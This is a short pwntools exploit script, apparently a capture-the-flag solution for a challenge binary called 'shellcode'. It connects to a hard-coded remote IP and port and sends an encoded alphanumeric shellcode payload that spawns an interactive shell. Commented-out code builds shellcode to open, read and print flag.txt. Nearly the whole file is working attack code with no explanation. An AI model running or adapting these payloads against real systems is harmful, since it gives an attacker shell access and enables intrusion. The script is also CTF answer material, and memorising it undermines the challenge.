#coding=utf-8
from pwn import *

context(arch="i386", os="linux")
context.log_level='debug'
# context.terminal=['tmux','splitw','-h']

ip = '106.55.152.166'
port = '38254'
reomote_addr = [ip,port]
binary = './shellcode'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF(binary)
if len(sys.argv)==1:
    p = process(binary)

if len(sys.argv)==2 :
    p = remote(reomote_addr[0],reomote_addr[1])

#----------------------------------------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda :p.interactive()
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

# def leak(offset):
# 	addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
# 	base = addr - offset
# 	print "[+]libc_base=>"+hex(base)
# 	return base

# shellcode = shellcraft.sh()
ru('> ')
payload1 = "PYVTX10X41PZ41H4A4I1TA71TADVTZ32PZNBFZDQC02DQD0D13DJE2O0Z2G7O1E7M04KO1P0S2L0Y3T3CKL0J0N000Q5A1W66MN0Y0X021U9J622A0H1Y0K3A7O5I3A114CKO0J1Y4Z5FML0M"
# shellcode = ''
# shellcode += shellcraft.open('./flag.txt')
# shellcode += shellcraft.read('eax','esp',0x100)
# shellcode += shellcraft.write(1,'esp',0x100)
# payload1 = asm(shellcode)
# print payload1
# pause()
sl(payload1.ljust(8191,'\x00'))
it()
